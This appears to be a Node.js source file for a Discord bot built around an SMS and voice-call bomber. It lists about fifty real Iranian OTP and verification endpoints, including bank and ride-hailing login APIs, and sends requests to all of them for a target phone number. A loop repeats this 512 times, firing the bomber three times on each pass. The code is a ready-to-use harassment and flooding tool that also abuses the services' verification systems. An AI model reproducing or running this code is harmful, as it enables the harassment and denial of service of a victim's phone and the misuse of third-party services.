const axios = require("axios");
const { Client, GatewayIntentBits } = require("discord.js")
const { config } = require("dotenv")

config()

async function bomb(number) {
  const sites = [
    {
      url:
        "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" +
        number,
      method: "POST",
      data: { cellphone: number },
    },
    {
      url: "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
      method: "POST",
      data: {
        mobile: number,
        confirmTerms: true,
        notRobot: false,
        ValidationCodeCreateReason: 5,
        OtpApp: 0,
        deviceTypeCode: 10,
        IsAppOnly: false,
      },
    },
    {
      url: "https://api.pindo.ir/v1/user/login-register/",
      method: "POST",
      data: {
        phone: number,
      },
    },
    {
      url: "https://api.torob.com/v4/user/phone/send-pin/?phone_number=09927208939&_http_referrer=https%3A%2F%2Fwww.google.com%2F&source=next_desktop",
      method: "GET",
      data: {
        phone_number: number,
        _http_referrer: "https://www.google.com/",
        source: "next_desktop",
      },
    },
    {
      url: "https://www.irantic.com/api/login/authenticate",
      method: "POST",
      data: {
        mobile: number,
      },
    },
    {
      url: "https://core.gapfilm.ir/api/v3.2/Account/Login",
      method: "POST",
      data: {
        Method: 1,
        PhoneNo: number,
      },
    },
    {
      url: "https://piccotoys.com/signin",
      method: "POST",
      data: {
        user_mobile: number,
      },
    },
    {
      url: "https://zitazi.com/wp-admin/admin-ajax.php",
      method: "POST",
      data: {
        countrycode: "+98",
        mobileNo: number,
        csrf: "3a77c29687",
        login: 2,
        json: 1,
      },
    },
    {
      url: "https://apix.snappshop.ir/auth/v1/pre-login?lat=35.77331&lng=51.418591",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://api.divar.ir/v5/auth/authenticate/voice",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://api.splus.ir/v3/auth/voice",
      method: "POST",
      data: { phone_number: number },
    },
    {
      url: "https://ibank.sbank.ir/api/v2/otp/voice",
      method: "POST",
      data: { username: number },
    },
    {
      url: "https://ibank.bpi.ir/api/otp/voice",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://api.tapsi.cab/api/v2.2/user",
      method: "POST",
      data: {
        credential: { phoneNumber: number, role: "PASSENGER" },
        otpOption: "VOICE",
      },
    },
    {
      url: "https://api.digikalajet.ir/user/login-register/voice-call/",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://auth.basalam.com/captcha/otp-request",
      method: "POST",
      data: {
        mobile: number,
        client_id: "11",
      },
    },
    {
      url: "https://api2.technogold.gold/customer/auth/send-otp",
      mobile: number,
    },
    {
      url: "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
      method: "POST",
      data: { source: "besina", mobile: number },
    },
    {
      url: "https://www.portal.ir/site/api/v1/user/otp",
      method: "POST",
      data: {
        template_id: 11111111,
        type: "etc",
        category: "etc",
        mobile: number,
        name: " ",
      },
    },
    {
      url: "https://api.snapp.ir/api/v1/sms/link",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://www.sheypoor.com/api/v10.0.0/auth/send",
      method: "POST",
      data: { username: number },
    },
    {
      url: "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
      method: "POST",
      data: { cellphone: number.replace("0", "+98") },
    },
    {
      url: "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
      method: "POST",
      data: {
        Parameters: {
          ApplicationType: "Web",
          ApplicationUniqueToken: "null",
          ApplicationVersion: "1.0.0",
          MobileNumber: number,
          UniqueToken: "null",
        },
      },
    },
    {
      url: "https://api.divar.ir/v5/auth/authenticate",
      method: "POST",
      data: { phone: number.replace(/^0/, "") },
    },
    {
      url: "https://football360.ir/api/auth/verify-phone/",
      method: "POST",
      data: { phone_number: number.replace("0", "+98") },
    },
    {
      url: "https://virgool.io/api/v1.4/auth/verify",
      method: "POST",
      data: {
        method: "phone",
        identifier: number.replace("0", "+98"),
        type: "register",
      },
    },
    {
      url: "https://www.snapptrip.com/register",
      method: "POST",
      data: {
        lang: "fa",
        country_id: "860",
        password: "12345678",
        mobile_phone: number.replace("0", "98"),
        country_code: "+98",
        email: "a@gmail.com",
      },
    },
    {
      url: "https://gw.taaghche.com/v4/site/auth/signup",
      method: "POST",
      data: { contact: number },
    },
    {
      url: "https://core.gapfilm.ir/api/v3.1/Account/Login",
      method: "POST",
      data: {
        Type: 3,
        Username: number.replace(/^0/, ""),
        SourceChannel: "GF_WebSite",
        SourcePlatform: "desktop",
        SourcePlatformAgentType: "Chrome",
        SourcePlatformVersion: "111.0.0.0",
        GiftCode: "null",
      },
    },
    {
      url: "https://api.digikalajet.ir/user/login-register/",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://api.tapsi.cab/api/v2.2/user",
      method: "POST",
      data: {
        credential: { phoneNumber: number, role: "PASSENGER" },
        otpOption: "SMS",
      },
    },
    {
      url: "https://mobapi.banimode.com/api/v2/auth/request",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://api.ostadkr.com/login",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://www.technolife.ir/shop",
      method: "POST",
      data: {
        query:
          "query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists(username: $username , repeat:$repeat){\n    result\n    request_id\n  }\n}",
        variables: { username: number },
        "g-recaptcha-response": "",
      },
    },
    {
      url: "https://www.hamrah-mechanic.com/api/v1/membership/otp",
      method: "POST",
      data: {
        PhoneNumber: number,
        prevDomainUrl: "https://www.google.com/",
        landingPageUrl: "https://www.hamrah-mechanic.com/",
        orderPageUrl: "https://www.hamrah-mechanic.com/membersignin/",
        prevUrl: "https://www.hamrah-mechanic.com/",
        referrer: "https://www.google.com/",
      },
    },
    {
      url: "https://api.mobit.ir/api/web/v8/register/register",
      method: "POST",
      data: { number: number },
    },
    {
      url: "https://auth.basalam.com/otp-request",
      method: "POST",
      data: { mobile: number, client_id: 11 },
    },
    {
      url: "https://www.miare.ir/api/otp/driver/request/",
      method: "POST",
      data: { phone_number: number },
    },
    {
      url: "https://api.vandar.io/account/v1/check/mobile",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://taraazws.jabama.com/api/v4/account/send-code",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: `https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=${number}`,
      method: "GET",
    },
    {
      url: "https://tikban.com/Account/LoginAndRegister",
      method: "POST",
      data: {
        phoneNumberCode: "+98",
        CellPhone: number,
        CaptchaKey: "null",
        JustMobilephone: number.replace(/^0/, ""),
      },
    },
    {
      url: "https://www.buskool.com/send_verification_code",
      method: "POST",
      data: { phone: number },
    },
    {
      url: "https://api.timcheh.com/auth/otp/send",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://api.sibche.com/profile/sendCode",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://apiwebsite.shavaz.com/Auth/SendConfirmCode",
      method: "POST",
      data: { mobile: number },
    },
    {
      url: "https://account.bama.ir/api/otp/generate/v2",
      method: "POST",
      data: { CellNumber: number, Appname: "bamawebapplication", smsfor: 6 },
    },
    {
      url: "https://pinket.com/api/cu/v2/phone-verification",
      method: "POST",
      data: { phoneNumber: number },
    },
    {
      url: `https://core.gap.im/v1/user/add.json?mobile=%2B${number.replace(
        "0",
        "98"
      )}`,
      method: "GET",
    },
  ];

  for (const site of sites) {
    try {
      const config = {
        method: site.method,
        url: site.url,
        ...(site.method === "POST" && { data: site.data }),
        timeout: 10000,
      };

      const response = await axios(config);
      console.log(`✅ ${site.url} - ${response.status}`);
      await new Promise((resolve) => setTimeout(resolve, 100));
    } catch (error) {
      if (error.response) {
        console.log(`🔴 ${site.url} - ${error.response.status}`);
      } else {
        console.log(`🔴 ${site.url} - Error: ${error.message}`);
      }
      continue;
    }
  }
}

async function call(number) {
  const sites = [
    {
      url: "https://api.digikalajet.ir/user/login-register/voice-call/",
      method: "POST",
      data: {
        phone: number,
        "g-recaptcha-response":
          "03AKH6MRGaYQlelcSA/R8S1u1DbQnaEvlsAB17X4IPxVLf9k40V1kgm28kvwcsPiye-TD72H51yuyJiJBjRoJOt87L0BWoXCik2pRRuadnOTo0hWs4fjbrly-RcXo_vvCdmffLRhrjYRf86SN4CuqXqnCSHhJ8sjRwNMTycjcL_uxpZd28V8XDX95BVUOFQzH6lvmeffiHI8KpAQr-8UWvRYjBhLfi-JwJK0BJGJt118q9Em7EMIwuN5kyUXMS2oBjORz2E_TPuVHjq65X_4oTRPxiN2-119XpYeB-AvwXk8q5v7rPunbt1JzUHM_6a_xCtjsFscBbBlpo-VJWzJWZVJpxl9CgZAx8I4bkEquhKjOghnK3mjil3TN2ColewBCGmCnCdNy0tdL6Q53_txJOUFORBx7KGjtV28-n5xkIaKw39r3EMwc__OhPe56LORbTCj6Zjt8uH4y4c03mVEkkoO5-huuxBNiz4_j440c3oAmuuB7A8P4-G2K5cJtDD-PHy1ZTH1WFdN0tJ_cox5-qXwXbOA1btJuJg9lvICRbCxHytO6rfeG39EX1X4VGR43brxzVliub0P9ZWDTJOwnWj6FUAesecp86hEA",
      },
    },
  ];

  for (const site of sites) {
    try {
      const response = await axios({
        method: site.method,
        url: site.url,
        data: site.data,
        timeout: 10000,
      });
      await new Promise((resolve) => setTimeout(resolve, 100));
    } catch (error) {
      if (error.response) {
        console.log(`✅ ${site.url} - ${error.response.status}`);
      } else {
        console.log(`⭕ ${site.url} - Error: ${error.message}`);
      }
      continue;
    }
  }
}

async function both(number) {
  for (let i = 0; i < 512; i++) {
    await call(number);
    bomb(number);
    bomb(number);
    bomb(number);
  }
}

const { BOT_TOKEN } = process.env

let penfing = []

const client = new Client({
  intents: [GatewayIntentBits.GuildMembers, GatewayIntentBits.GuildMessages]
});

client.login(BOT_TOKEN)

